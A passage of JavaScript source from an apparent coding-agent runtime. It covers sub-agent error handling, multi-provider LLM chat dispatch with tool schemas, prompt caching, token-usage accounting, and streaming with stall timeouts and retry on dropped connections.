      artifactCount: result.artifacts.length,
    };
  } catch (err) {
    subCtx.forceComplete(err.message);

    // Move the failed sub-agent out of the registry's `_active` Map into bounded
    // history (mirrors the success path). Without this, a sub-agent whose run()
    // threw outside its own try (setup/summarize error) lingers in `_active`
    // forever and over-reports as "active" to monitors/UI.
    if (registry) {
      try {
        registry.complete(subCtx.id, subCtx.result);
      } catch (_err) {
        // Non-critical
      }
    }

    emit("sub-agent.failed", {
      status: subCtx.status,
      error: err.message,
      completedAt: subCtx.completedAt,
    });

    if (
      err?.runtimeLedgerPersistence === true ||
      err?.workflowEffectOutcomeUnknown === true
    ) {
      throw err;
    }

    return {
      error: `Sub-agent failed: ${err.message}`,
      subAgentId: subCtx.id,
      role: subCtx.role,
      parentSessionId,
      childBinding: subCtx.recoveryBinding(subCtx.result),
    };
  }
}

// ─── LLM chat with tools ─────────────────────────────────────────────────

function getEffectiveToolDefinitions(options = {}) {
  const persona =
    options.hermeticExecution === true
      ? null
      : _loadProjectPersona(options.cwd);
  // Merge every deny source before both schema projection and execution-time
  // enforcement. Keeping this in one helper prevents those two fences from
  // drifting apart.
  const mergedDisabledTools = [
    ...(Array.isArray(persona?.toolsDisabled) ? persona.toolsDisabled : []),
    ...(Array.isArray(options.disabledTools) ? options.disabledTools : []),
  ];
  return getAgentToolDefinitions({
    names: options.enabledToolNames,
    disabledTools: mergedDisabledTools,
    exactToolNames: options.exactToolNames === true,
    extraTools: [
      ...(options.hostManagedToolPolicy?.toolDefinitions || []),
      ...(options.extraToolDefinitions || []),
    ],
  });
}

function _isNonNegativeSafeInteger(value) {
  return Number.isSafeInteger(value) && value >= 0;
}

function _providerUsageCount(usage, canonical, alias) {
  if (!usage || typeof usage !== "object" || Array.isArray(usage)) return null;
  const hasCanonical = Object.prototype.hasOwnProperty.call(usage, canonical);
  const hasAlias = Object.prototype.hasOwnProperty.call(usage, alias);
  if (!hasCanonical && !hasAlias) return null;
  if (hasCanonical && hasAlias && usage[canonical] !== usage[alias])
    return null;
  const value = hasCanonical ? usage[canonical] : usage[alias];
  return _isNonNegativeSafeInteger(value) ? value : null;
}

function _optionalProviderUsageCount(usage, canonical, alias) {
  if (!usage || typeof usage !== "object" || Array.isArray(usage)) return null;
  const hasCanonical = Object.prototype.hasOwnProperty.call(usage, canonical);
  const hasAlias = Object.prototype.hasOwnProperty.call(usage, alias);
  if (!hasCanonical && !hasAlias) return 0;
  if (hasCanonical && hasAlias && usage[canonical] !== usage[alias])
    return null;
  const value = hasCanonical ? usage[canonical] : usage[alias];
  return _isNonNegativeSafeInteger(value) ? value : null;
}

function _hasCompleteProviderUsage(usage) {
  return (
    _providerUsageCount(usage, "input_tokens", "prompt_tokens") != null &&
    _providerUsageCount(usage, "output_tokens", "completion_tokens") != null &&
    _optionalProviderUsageCount(
      usage,
      "cache_read_input_tokens",
      "cache_read_tokens",
    ) != null &&
    _optionalProviderUsageCount(
      usage,
      "cache_creation_input_tokens",
      "cache_creation_tokens",
    ) != null
  );
}

const PROVIDER_REQUEST_ID_RE = /^[\x21-\x7e]{1,512}$/;
const PROVIDER_RECEIPT_ID_RE = /^[A-Za-z0-9._:-]{1,256}$/;

function _normalizeProviderRequestId(value) {
  if (value == null) return null;
  if (typeof value !== "string" || !PROVIDER_REQUEST_ID_RE.test(value)) {
    throw new TypeError(
      "providerRequestId must be 1-512 printable ASCII characters",
    );
  }
  return value;
}

function _physicalProviderRequestId(logicalRequestId, attempt) {
  if (!logicalRequestId) return null;
  const retry = Number(attempt);
  if (!Number.isSafeInteger(retry) || retry <= 0) return logicalRequestId;
  const suffix = `-r${retry}`;
  return `${logicalRequestId.slice(0, 512 - suffix.length)}${suffix}`;
}

function _providerReceiptId(value) {
  return typeof value === "string" && PROVIDER_RECEIPT_ID_RE.test(value)
    ? value
    : null;
}

function _isOfficialOpenAIEndpoint(provider, baseUrl) {
  if (provider !== "openai") return false;
  try {
    const parsed = new URL(String(baseUrl));
    return (
      parsed.protocol === "https:" &&
      parsed.hostname.toLowerCase() === "api.openai.com" &&
      !parsed.port &&
      !parsed.username &&
      !parsed.password
    );
  } catch {
    return false;
  }
}

/**
 * Capture only provider-returned identifiers. X-Client-Request-Id is a
 * trace/correlation header, not an idempotency guarantee, so a locally sent
 * client id alone is deliberately not called a receipt.
 */
function _openAIProviderRequestReceipt(response, data, clientRequestId) {
  if (!clientRequestId) return null;
  const requestId = _providerReceiptId(
    response?.headers?.get?.("x-request-id"),
  );
  const responseId = _providerReceiptId(data?.id);
  if (!requestId && !responseId) return null;
  return Object.freeze({
    protocol: "cc-provider-request-receipt/v1",
    provider: "openai",
    clientRequestId,
    requestId,
    responseId,
    requestIdentitySemantics: "trace-only",
    independentlyReadable: false,
  });
}

/**
 * Send a chat completion request with tool definitions.
 * Supports 8 providers: ollama, anthropic, openai, deepseek, dashscope, gemini, mistral, volcengine
 *
 * @param {Array} rawMessages
 * @param {object} options
 * @returns {Promise<object>} response with .message
 */
export async function chatWithTools(rawMessages, options) {
  const {
    provider,
    model,
    baseUrl,
    apiKey,
    contextEngine: ce,
    signal,
  } = options;

  const providerRequestId = _normalizeProviderRequestId(
    options.providerRequestId,
  );

  let tools = getEffectiveToolDefinitions(options);
  if (Array.isArray(options.contextMemorySelectedToolNames)) {
    const selected = new Set(options.contextMemorySelectedToolNames);
    tools = tools.filter((tool) => selected.has(tool?.function?.name));
  }

  let providerMessages = rawMessages;
  let canonicalPlan = null;
  if (
    options.contextMemoryPreplanned !== true &&
    options.contextMemorySkipPlanning !== true
  ) {
    const { prepareCanonicalProviderContext } =
      await import("../lib/context-memory-kernel/provider-context.js");
    const prepared = await prepareCanonicalProviderContext(rawMessages, {
      ...options,
      contextMemoryToolDefinitions: tools,
    });
    providerMessages = prepared.messages;
    canonicalPlan = prepared.plan;
    if (canonicalPlan) {
      const selected = new Set(prepared.selectedToolNames);
      tools = tools.filter((tool) => selected.has(tool?.function?.name));
    }
  }
  const lastUserMsg = [...providerMessages]
    .reverse()
    .find((m) => m.role === "user");
  const messages =
    ce && !canonicalPlan
      ? ce.buildOptimizedMessages(providerMessages, {
          userQuery: lastUserMsg?.content,
        })
      : providerMessages;

  throwIfAborted(signal);

  if (provider === "ollama") {
    const apiUrl = `${baseUrl}/api/chat`;
    // Multimodal (`cc agent --image`): ollama wants `{content, images:[base64]}`
    // not OpenAI-style `image_url` blocks. Convert only when an image part is
    // present so text-only runs keep the identical request shape.
    const ollamaMessages = hasImageContent(messages)
      ? toOllamaMessages(messages)
      : messages;
    // Real-time token deltas (Claude-Code `--include-partial-messages`): when
    // the caller supplies an onToken hook, stream the response and forward each
    // content chunk as it arrives. Tool calls + usage are accumulated and the
    // same {message, usage} shape is returned, so the agent loop is unchanged.
    // Without onToken we keep the cheaper single-shot non-streaming request.
    if (typeof options.onToken === "function") {
      return await _retryStreamingChat(
        () =>
          _chatOllamaStreaming(
            apiUrl,
            {
              model,
              messages: ollamaMessages,
              tools,
              ...(options.maxOutputTokens
                ? { options: { num_predict: options.maxOutputTokens } }
                : {}),
            },
            options.onToken,
            signal,
            options.onStall,
            options.streamStallMs,
            options.streamStallTimeoutMs,
          ),
        {
          signal,
          retries: options.workflowEffectId ? 0 : undefined,
          strictRetryObserver: options.strictUsageTelemetry === true,
          ...(typeof options.onStreamRetry === "function"
            ? {
                onRetry: (attempt, error, telemetry) =>
                  options.onStreamRetry(attempt, error, {
                    ...telemetry,
                    provider: "ollama",
                    model: model || null,
                  }),
              }
            : {}),
        },
      );
    }
    const response = await fetch(apiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      signal,
      body: JSON.stringify({
        model,
        messages: ollamaMessages,
        tools,
        stream: false,
        ...(options.maxOutputTokens
          ? { options: { num_predict: options.maxOutputTokens } }
          : {}),
      }),
    });
    if (!response.ok) {
      throw new Error(await formatProviderResponseError("ollama", response));
    }
    const data = await response.json();
    if (
      _isNonNegativeSafeInteger(data.prompt_eval_count) &&
      _isNonNegativeSafeInteger(data.eval_count)
    ) {
      data.usage = {
        input_tokens: data.prompt_eval_count,
        output_tokens: data.eval_count,
      };
    } else {
      delete data.usage;
    }
    return data;
  }

  if (provider === "anthropic") {
    const key = apiKey || process.env.ANTHROPIC_API_KEY;
    if (!key) throw new Error("ANTHROPIC_API_KEY required");

    const systemMsgs = messages.filter((m) => m.role === "system");
    const otherMsgs = messages.filter((m) => m.role !== "system");

    const anthropicTools = tools.map((t) => ({
      name: t.function.name,
      description: t.function.description,
      input_schema: t.function.parameters,
    }));

    // Prompt caching (Claude-Code parity, default-on): the system prompt + the
    // ~18 tool schemas are a large, stable prefix re-sent on every agent-loop
    // iteration. Marking the LAST tool and the system block as cache
    // breakpoints lets Anthropic serve that prefix from cache (~10% the input
    // cost, lower latency) across iterations and turns. Anthropic ignores a
    // breakpoint when the prefix is under the model's minimum cacheable size,
    // so it is always safe. Opt out (e.g. a custom gateway that rejects the
    // field) with CC_PROMPT_CACHE=0 or options.promptCaching:false.
    const cacheEnabled =
      options.promptCaching !== false && process.env.CC_PROMPT_CACHE !== "0";
    if (cacheEnabled && anthropicTools.length > 0) {
      const last = anthropicTools.length - 1;
      anthropicTools[last] = {
        ...anthropicTools[last],
        cache_control: { type: "ephemeral" },
      };
    }

    // Model-aware max_tokens (Opus → 16384, Haiku → 4096, else 8192) via
    // provider-options. We read ONLY maxTokens: the module's `temperature`
    // default is never forwarded (400s on Opus 4.7/4.8).
    // Fallback to the CURRENT Sonnet, not a retired snapshot:
    // claude-sonnet-4-20250514 was retired 2026-06-15 and would 404 here.
    const effModel = model || "claude-sonnet-4-6";
    const { maxTokens: anthropicMaxTokens } = mergeProviderOptions(
      "anthropic",
      effModel,
    );
    const body = {
      model: effModel,
      max_tokens: options.maxOutputTokens
        ? Math.min(anthropicMaxTokens || 8192, options.maxOutputTokens)
        : anthropicMaxTokens || 8192,
      // Convert cc's internal OpenAI-shaped history (role:"tool" results,
      // assistant tool_calls[]) into Anthropic content blocks. Without this,
      // multi-turn tool use 400s on turn 2 (Anthropic rejects role:"tool" and
      // assistant `tool_calls`). Also replays preserved thinking blocks.
      messages: _toAnthropicMessages(otherMsgs),
      tools: anthropicTools,
    };
    // Extended thinking — OPT-IN via options.thinking; off by default so the
    // request is byte-identical to before. Model-aware (adaptive+effort on Opus
    // 4.6+/Sonnet 4.6, legacy enabled+budget else; nothing on Haiku). temperature
    // is never sent. RUNTIME-UNVERIFIED: no Anthropic key here to E2E the
    // thinking-block signature replay (see cli_claude_code_parity_landed memory).
    const thinkingParams = _anthropicThinkingParams(
      effModel,
      options,
      body.max_tokens,
    );
    if (thinkingParams) Object.assign(body, thinkingParams);
    if (systemMsgs.length > 0) {
      const systemText = systemMsgs.map((m) => m.content).join("\n");
      // Array-form system with a cache breakpoint when caching is on; plain
      // string otherwise (byte-identical to the prior request shape).
      body.system = cacheEnabled
        ? [
            {
              type: "text",
              text: systemText,
              cache_control: { type: "ephemeral" },
            },
          ]
        : systemText;
    }

    const url =
      baseUrl && baseUrl !== "http://localhost:11434"
        ? baseUrl
        : "https://api.anthropic.com/v1";

    // Real token streaming (--include-partial-messages): stream the SSE response
    // and forward text deltas live, assembling tool_use blocks back into the
    // same {message, usage} shape the non-streaming path returns.
    if (typeof options.onToken === "function") {
      return await _retryStreamingChat(
        () =>
          _chatAnthropicStreaming(
            `${url}/messages`,
            { ...body, stream: true },
            { "x-api-key": key, "anthropic-version": "2023-06-01" },
            options.onToken,
            signal,
            options.onThinking,
            options.onStall,
            options.streamStallMs,
            options.streamStallTimeoutMs,
          ),
        {
          signal,
          retries: options.workflowEffectId ? 0 : undefined,
          strictRetryObserver: options.strictUsageTelemetry === true,
          ...(typeof options.onStreamRetry === "function"
            ? {
                onRetry: (attempt, error, telemetry) =>
                  options.onStreamRetry(attempt, error, {
                    ...telemetry,
                    provider: "anthropic",
                    model: effModel,
                  }),
              }
            : {}),
        },
      );
    }

    const response = await fetch(`${url}/messages`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-key": key,
        "anthropic-version": "2023-06-01",
      },
      signal,
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      throw new Error(await formatProviderResponseError("anthropic", response));
    }

    const data = await response.json();
    const normalized = _normalizeAnthropicResponse(data);
    if (_hasCompleteProviderUsage(data.usage)) {
      normalized.usage = {
        // With prompt caching, Anthropic splits input into uncached
        // `input_tokens` + cache read/write — capture all three so cost
        // accounting prices the cached prefix correctly (read ≈ 0.1×,
        // write ≈ 1.25× input). Absent (caching off) → 0, byte-identical.
        input_tokens: _providerUsageCount(
          data.usage,
          "input_tokens",
          "prompt_tokens",
        ),
        output_tokens: _providerUsageCount(
          data.usage,
          "output_tokens",
          "completion_tokens",
        ),
        cache_read_input_tokens: _optionalProviderUsageCount(
          data.usage,
          "cache_read_input_tokens",
          "cache_read_tokens",
        ),
        cache_creation_input_tokens: _optionalProviderUsageCount(
          data.usage,
          "cache_creation_input_tokens",
          "cache_creation_tokens",
        ),
      };
    }
    return normalized;
  }

  // OpenAI-compatible providers
  const providerUrls = {
    openai: "https://api.openai.com/v1",
    deepseek: "https://api.deepseek.com/v1",
    dashscope: "https://dashscope.aliyuncs.com/compatible-mode/v1",
    mistral: "https://api.mistral.ai/v1",
    gemini: "https://generativelanguage.googleapis.com/v1beta/openai",
    volcengine: "https://ark.cn-beijing.volces.com/api/v3",
  };

  const providerApiKeyEnvs = {
    openai: "OPENAI_API_KEY",
    deepseek: "DEEPSEEK_API_KEY",
    dashscope: "DASHSCOPE_API_KEY",
    mistral: "MISTRAL_API_KEY",
    gemini: "GEMINI_API_KEY",
    volcengine: "VOLCENGINE_API_KEY",
  };

  const url =
    baseUrl && baseUrl !== "http://localhost:11434"
      ? baseUrl
      : providerUrls[provider];

  if (!url) {
    throw new Error(
      `Unsupported provider: ${provider}. Supported: ollama, anthropic, openai, deepseek, dashscope, mistral, gemini, volcengine`,
    );
  }
  const supportsOpenAIRequestIdentity = _isOfficialOpenAIEndpoint(
    provider,
    url,
  );

  const envKey = providerApiKeyEnvs[provider] || "OPENAI_API_KEY";
  const key = apiKey || process.env[envKey];
  if (!key) throw new Error(`${envKey} required for provider ${provider}`);

  const defaultModels = {
    openai: "gpt-4o",
    deepseek: "deepseek-chat",
    dashscope: "qwen-turbo",
    mistral: "mistral-large-latest",
    gemini: "gemini-2.0-flash",
    volcengine: "deepseek-v4-flash-260425",
  };

  // Real token streaming (--include-partial-messages) for every OpenAI-compatible
  // provider (openai / deepseek / dashscope / mistral / gemini / volcengine):
  // stream the SSE response, forward content deltas live, and reassemble the
  // delta-fragmented tool_calls into the standard {message, usage} shape.
  if (typeof options.onToken === "function") {
    return await _retryStreamingChat(
      (attempt = 0) =>
        _chatOpenAIStreaming(
          `${url}/chat/completions`,
          {
            model: model || defaultModels[provider] || "gpt-4o-mini",
            messages,
            tools,
            stream: true,
            stream_options: { include_usage: true },
            ...(options.maxOutputTokens
              ? { max_tokens: options.maxOutputTokens }
              : {}),
          },
          key,
          options.onToken,
          signal,
          provider,
          options.onStall,
          options.streamStallMs,
          options.streamStallTimeoutMs,
          supportsOpenAIRequestIdentity
            ? _physicalProviderRequestId(providerRequestId, attempt)
            : null,
        ),
      {
        signal,
        retries: options.workflowEffectId ? 0 : undefined,
        strictRetryObserver: options.strictUsageTelemetry === true,
        ...(typeof options.onStreamRetry === "function"
          ? {
              onRetry: (attempt, error, telemetry) =>
                options.onStreamRetry(attempt, error, {
                  ...telemetry,
                  provider,
                  model: model || defaultModels[provider] || "gpt-4o-mini",
                }),
            }
          : {}),
      },
    );
  }

  const response = await fetch(`${url}/chat/completions`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${key}`,
      ...(supportsOpenAIRequestIdentity && providerRequestId
        ? { "X-Client-Request-Id": providerRequestId }
        : {}),
    },
    signal,
    body: JSON.stringify({
      model: model || defaultModels[provider] || "gpt-4o-mini",
      messages,
      tools,
      ...(options.maxOutputTokens
        ? { max_tokens: options.maxOutputTokens }
        : {}),
    }),
  });

  if (!response.ok) {
    throw new Error(await formatProviderResponseError(provider, response));
  }

  const data = await response.json();
  if (!data.choices || !data.choices[0]) {
    throw new Error("Invalid API response: no choices returned");
  }
  const choice = data.choices[0];
  const out = { message: choice.message };
  const providerReceipt = supportsOpenAIRequestIdentity
    ? _openAIProviderRequestReceipt(response, data, providerRequestId)
    : null;
  if (providerReceipt) out.providerReceipt = providerReceipt;
  if (_hasCompleteProviderUsage(data.usage)) {
    // OpenAI/DeepSeek/volcengine report cached prompt tokens AS PART of
    // prompt_tokens — split them out so cost prices the cached prefix at the
    // provider's cache rate, not full input. 0 (or absent) → input unchanged.
    const promptTokens = _providerUsageCount(
      data.usage,
      "input_tokens",
      "prompt_tokens",
    );
    const completionTokens = _providerUsageCount(
      data.usage,
      "output_tokens",
      "completion_tokens",
    );
    const cached = _openaiCachedTokens(data.usage);
    if (cached != null && cached <= promptTokens) {
      out.usage = {
        input_tokens: promptTokens - cached,
        output_tokens: completionTokens,
        cache_read_input_tokens: cached,
      };
    }
  }
  return out;
}

// ─── Ollama streaming (token deltas for --include-partial-messages) ─────────
//
// Ollama `/api/chat` with `stream:true` returns NDJSON: one JSON object per
// line, each carrying an incremental `message.content` chunk, optional
// `message.tool_calls` (emitted whole, not byte-streamed), and a final line
// with `done:true` + `prompt_eval_count`/`eval_count` token totals. We reduce
// the stream line-by-line so onToken fires live, then finalize into the same
// {message, usage} shape the non-streaming branch returns.

function _ollamaInitState() {
  return {
    role: "assistant",
    content: "",
    toolCalls: null,
    promptEval: null,
    evalCount: null,
    usageInvalid: false,
  };
}

function _streamUiCallbacks(onToken, onThinking) {
  let pending = [];
  const capture = (callback) =>
    typeof callback === "function"
      ? (value) => {
          try {
            const result = callback(value);
            if (result && typeof result.then === "function") {
              pending.push(Promise.resolve(result));
            }
          } catch (error) {
            pending.push(Promise.reject(error));
          }
        }
      : callback;
  return {
    onToken: capture(onToken),
    onThinking: capture(onThinking),
    async settle() {
      if (pending.length === 0) return;
      const current = pending;
      pending = [];
      const outcomes = await Promise.allSettled(current);
      const fatal = outcomes.find(
        (outcome) =>
          outcome.status === "rejected" &&
          outcome.reason?.isOutputBackpressureFailure === true,
      );
      if (fatal) throw fatal.reason;
      // Generic UI callback failures retain their historical best-effort
      // semantics. Branded output failures are lifecycle failures and abort the
      // provider stream instead of allowing its terminal queue to grow.
    },
  };
}

function _ollamaReduceLine(state, line, onToken) {
  const s = (line || "").trim();
  if (!s) return state;
  let obj;
  try {
    obj = JSON.parse(s);
  } catch {
    return state; // tolerate partial/garbage lines mid-stream
  }
  const msg = obj.message;
  if (msg) {
    if (msg.role) state.role = msg.role;
    if (typeof msg.content === "string" && msg.content) {
      state.content += msg.content;
      if (typeof onToken === "function") {
        try {
          onToken(msg.content);
        } catch {
          // A failing UI hook must never break the agent run.
        }
      }
    }
    if (Array.isArray(msg.tool_calls) && msg.tool_calls.length) {
      state.toolCalls = (state.toolCalls || []).concat(msg.tool_calls);
    }
  }
  if (Object.prototype.hasOwnProperty.call(obj, "prompt_eval_count")) {
    if (_isNonNegativeSafeInteger(obj.prompt_eval_count)) {
      state.promptEval = obj.prompt_eval_count;
    } else {
      state.usageInvalid = true;
    }
  }
  if (Object.prototype.hasOwnProperty.call(obj, "eval_count")) {
    if (_isNonNegativeSafeInteger(obj.eval_count)) {
      state.evalCount = obj.eval_count;
    } else {
      state.usageInvalid = true;
    }
  }
  return state;
}

function _ollamaFinalize(state) {
  const message = { role: state.role, content: state.content };
  if (state.toolCalls && state.toolCalls.length) {
    message.tool_calls = state.toolCalls;
  }
  const data = { message };
  if (
    state.usageInvalid !== true &&
    _isNonNegativeSafeInteger(state.promptEval) &&
    _isNonNegativeSafeInteger(state.evalCount)
  ) {
    data.usage = {
      input_tokens: state.promptEval,
      output_tokens: state.evalCount,
    };
  }
  return data;
}

/**
 * Pure reducer over an iterable of Ollama NDJSON lines. Exported for tests so
 * the parse/accumulate logic can be exercised without a live HTTP stream.
 */
export function _accumulateOllamaStream(lines, onToken) {
  const state = _ollamaInitState();
  for (const line of lines) _ollamaReduceLine(state, line, onToken);
  return _ollamaFinalize(state);
}

/**
 * Decide how to handle an error thrown mid-stream while reading an SSE / NDJSON
 * response body. Returns:
 *   - "rethrow"  — the error is a user abort (Esc / AbortController) or no
 *                  partial text was accumulated, so surface it to the caller.
 *   - "preserve" — a genuine connection drop (ECONNRESET / "terminated" /
 *                  server hangup) after some text already streamed to the user;
 *                  finalize and return what we have instead of replacing the
 *                  visible partial answer with a raw network error.
 *
 * Parity with Claude-Code 2.1.179 ("preserving partial responses instead of
 * showing raw errors"). Pure + exported for unit tests.
 */
export function _streamErrorDisposition(err, signal, partialText) {
  if (err?.isOutputBackpressureFailure === true) return "rethrow";
  if (isAbortError(err)) return "rethrow";
  if (signal && signal.aborted) return "rethrow";
  if (typeof partialText === "string" && partialText.trim()) return "preserve";
  return "rethrow";
}

/**
 * Format a provider HTTP error with an actionable hint. 401/403 almost always
 * means a missing/invalid API key for the ACTIVE provider — and because the
 * provider is resolved from config, a surprise "anthropic 401" usually means
 * the effective provider differs from what the user configured. Name the
 * provider and point at the appropriate key, billing, or permission fix
 * instead of dumping a bare status code. Pure + exported for tests.
 */
/**
 * Is this error from a streaming chat request a transient API CONNECTION drop
 * that is safe to retry? True only for genuine network failures (reset /
 * timeout / DNS / refused / socket hangup / undici "terminated" / "fetch
 * failed"). False for user aborts and for HTTP/status errors (a 4xx/auth/5xx is
 * the server's verdict carried in the message, not a dropped pipe — retrying a
 * connection that never dropped won't help and could double-bill).
 *
 * Safe to act on at the dispatch seam because any error that propagates OUT of
 * `_chat*Streaming` is either an abort or a drop with ZERO output already
 * streamed (partial-output drops are preserved internally and never throw) — so
 * a retry can never duplicate visible text. Pure + exported for tests.
 */
// Re-exported from the shared classifier (src/lib/stream-retry.js) so agent-core
// internals and existing test imports keep resolving it from this module, while
// the agent and chat streaming paths share ONE definition (no drift). The retry
// budget constants (STREAM_RETRY_MAX / STREAM_RETRY_BASE_MS) come from there too.
export const _isRetryableStreamError = isRetryableStreamError;
// 2.1.185 parity: when a streaming response goes silent mid-flight (the TCP
// connection is alive but no bytes arrive — a slow/overloaded API), surface a
// "waiting for API response" hint after this many ms instead of leaving the
// user staring at a frozen spinner. Upstream raised this from 10s to 20s.
const STREAM_STALL_MS = 20000;
// Hard inactivity timeout: a stream silent for this long is treated as a dead
// connection — the watchdog cancels the reader and throws a RETRYABLE error so
// `_retryStreamingChat` re-issues the request instead of hanging forever.
// Default 180s mirrors the long-standing `cc chat`/`cc ask` stall guard
// (chat-core.js STREAM_STALL_MS / CC_CHAT_STALL_MS) — generous enough that even
// a slow local model's first token arrives in time, while still recovering from
// a genuinely dead connection by default. Set llm.streamStallTimeoutMs (or pass
// streamStallTimeoutMs: 0) to tune or disable. The 20s hint above still fires
// first. Must exceed STREAM_STALL_MS.
const STREAM_STALL_TIMEOUT_MS = 180000;
const _STREAM_STALL = Symbol("stream-stall");

/**
 * Run a streaming chat attempt with bounded auto-retry on transient API
 * connection drops (Claude-Code 2.1.181: "auto-retry for API connection drops
 * during thinking"). Only connection-level failures are retried (see
 * `_isRetryableStreamError`); user aborts and HTTP/status errors surface
 * immediately. Backoff is exponential and abort-aware. Transparent to the
 * caller: on success returns the attempt's result; on exhaustion rethrows the
 * last error — strictly better than today (one drop → instant error).
 *
 * @param {() => Promise<any>} streamFn  invokes one `_chat*Streaming` attempt
 * @param {object} opts  { signal?, retries?, baseDelayMs?, onRetry?, strictRetryObserver?, sleep? }
 */
export async function _retryStreamingChat(streamFn, opts = {}) {
  // Default budget honors CC_MAX_RETRIES / CLAUDE_CODE_MAX_RETRIES (capped 15);
  // an explicit opts.retries still wins (tests / callers that pin it).
  const retries = opts.retries ?? resolveStreamRetryMax();
  const base = opts.baseDelayMs ?? STREAM_RETRY_BASE_MS;
  const signal = opts.signal;
  const sleep = opts.sleep || ((ms) => new Promise((r) => setTimeout(r, ms)));
  const now = typeof opts.now === "function" ? opts.now : Date.now;
  let attempt = 0;
  for (;;) {
    const attemptStartedAt = now();
    try {
      return await streamFn(attempt);
    } catch (err) {
      if (attempt >= retries || !_isRetryableStreamError(err, signal))
        throw err;
      attempt++;
      if (
        opts.strictRetryObserver === true &&
        typeof opts.onRetry !== "function"
      ) {
        throw _runtimeUsageBoundaryFailure(
          null,
          "CC_RETRY_OBSERVER_REQUIRED",
          "Strict streaming retry requires a synchronous persistence observer",
        );
      }
      if (typeof opts.onRetry === "function") {
        try {
          const observation = opts.onRetry(attempt, err, {
            durationMs: Math.max(0, now() - attemptStartedAt),
          });
          if (observation && typeof observation.then === "function") {
            void Promise.resolve(observation).catch(() => {});
            if (opts.strictRetryObserver === true) {
              const observerError = new Error(
                "Strict retry observer must be synchronous",
              );
              observerError.code = "CC_RETRY_OBSERVER_ASYNC";
              throw observerError;
            }
          }
        } catch (observerError) {
          // A persisted usage ledger must record the failed attempt before a
          // second billable transport attempt starts. Strict hosts opt into a
          // fail-closed observer; legacy/unpersisted callers retain the former
          // best-effort notification behavior.
          if (
            opts.strictRetryObserver === true ||
            observerError?.code === "CC_SESSION_PERSISTENCE_FAILED"
          ) {
            throw _runtimeUsageBoundaryFailure(
              observerError,
              observerError?.code || "CC_RETRY_PERSISTENCE_FAILED",
              "Streaming retry persistence failed",
            );
          }
        }
      }
      await sleep(base * Math.pow(2, attempt - 1));
      if (signal && signal.aborted) throw err; // user bailed during backoff
    }
  }
}

/**
 * Finalize a partial stream into the standard {message, usage} shape after a
 * mid-stream connection drop: marks the message truncated and drops any
 * half-streamed tool_call (its JSON args are incomplete and not safely
 * executable), so the agent loop treats it as a partial text answer and ends
 * the turn showing what the user already saw.
 */
function _finalizeTruncatedStream(finalize, state) {
  const out = finalize(state);
  if (out.message && out.message.tool_calls) delete out.message.tool_calls;
  if (out.message) out.message._truncated = true;
  return out;
}

// Wrap a ReadableStream reader so the read loop yields chunk values while a
// watchdog (a) fires `onStall(elapsedMs, stallTimeoutMs)` at most once per silent
// gap longer than `stallMs` (2.1.185 stream-stall hint; the 2nd arg lets the hint
// surface the auto-retry deadline, 0 when no timeout) and (b) — when `stallTimeoutMs` is
// set — cancels the reader and throws a RETRYABLE ETIMEDOUT after that long a
// silence, so a permanently dead-but-open connection recovers via the retry
// layer instead of hanging forever. The SAME in-flight read() promise is
// re-raced against a fresh timer each tick, so no chunk is ever dropped or
// double-read; `done`, errors, and aborts propagate unchanged. With neither a
// hook nor a timeout this degrades to a plain read loop (zero extra timers).
export async function* _iterateStreamWithStall(reader, opts = {}) {
  const onStall = typeof opts.onStall === "function" ? opts.onStall : null;
  const stallMs = opts.stallMs ?? STREAM_STALL_MS;
  const timeoutMs =
    opts.stallTimeoutMs == null ? STREAM_STALL_TIMEOUT_MS : opts.stallTimeoutMs;
  for (;;) {
    const readP = reader.read();
    // Fast path: nothing to watch for — await the chunk directly.
    if (!onStall && !timeoutMs) {
      const { done, value } = await readP;
      if (done) return;
      yield value;
      continue;
    }
    const start = Date.now();
    let notified = false;
    let result;
    for (;;) {
      const elapsed = Date.now() - start;
      // Hard inactivity timeout reached: cancel the dead stream (release the
      // socket) and throw a retryable error the dispatch seam re-issues.
      if (timeoutMs && elapsed >= timeoutMs) {
        try {
          await reader.cancel();
        } catch {
          /* best-effort release — the throw below is what matters */
        }
        const err = new Error(
          `stream stalled: no data from API for ${Math.round(elapsed / 1000)}s`,
        );
        err.code = "ETIMEDOUT";
        throw err;
      }
      // Wake at whichever fires first: the one-shot stall hint or the timeout.
      const waits = [];
      if (onStall && !notified) waits.push(stallMs - elapsed);
      if (timeoutMs) waits.push(timeoutMs - elapsed);
      const nextWait = waits.length ? Math.max(0, Math.min(...waits)) : null;
      if (nextWait == null) {
        // Hint already fired and no timeout — just wait for the chunk.
        result = await readP;
        break;
      }
      let timer;
      const wakeP = new Promise((resolve) => {
        timer = setTimeout(() => resolve(_STREAM_STALL), nextWait);
        if (timer && typeof timer.unref === "function") timer.unref();
      });
      let r;
      try {
        r = await Promise.race([readP, wakeP]);
      } finally {
        clearTimeout(timer);
      }
      if (r === _STREAM_STALL) {
        // A timer woke us. Fire the one-shot hint if we've crossed stallMs; the
        // loop re-evaluates `elapsed` to decide hint-vs-hard-timeout next tick.
        if (onStall && !notified && Date.now() - start >= stallMs) {
          notified = true;
          try {
            // 2.1.185: pass the hard-timeout deadline so the hint can tell the
            // user when the dead-but-open stream will be auto-retried (0 = no
            // timeout configured → caller shows no retry deadline).
            onStall(Date.now() - start, timeoutMs || 0);
          } catch {
            /* stall hint is best-effort — never break the stream over it */
          }
        }
        continue; // keep awaiting the SAME read() against a fresh timer
      }
      result = r;
      break;
    }
    if (result.done) return;
    yield result.value;
  }
}

async function _chatOllamaStreaming(
  apiUrl,
  body,
  onToken,
  signal,
  onStall,
  stallMs,
  stallTimeoutMs,
) {
  const response = await fetch(apiUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    signal,
    body: JSON.stringify({ ...body, stream: true }),
  });
  if (!response.ok) {
    throw new Error(await formatProviderResponseError("ollama", response));
  }
  const state = _ollamaInitState();
  const ui = _streamUiCallbacks(onToken);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buf = "";
  try {
    for await (const value of _iterateStreamWithStall(reader, {
      onStall,
      stallMs,
      stallTimeoutMs,
    })) {
      buf += decoder.decode(value, { stream: true });
      let idx;
      while ((idx = buf.indexOf("\n")) >= 0) {
        _ollamaReduceLine(state, buf.slice(0, idx), ui.onToken);
        await ui.settle();
        buf = buf.slice(idx + 1);
      }
    }
    if (buf.trim()) {
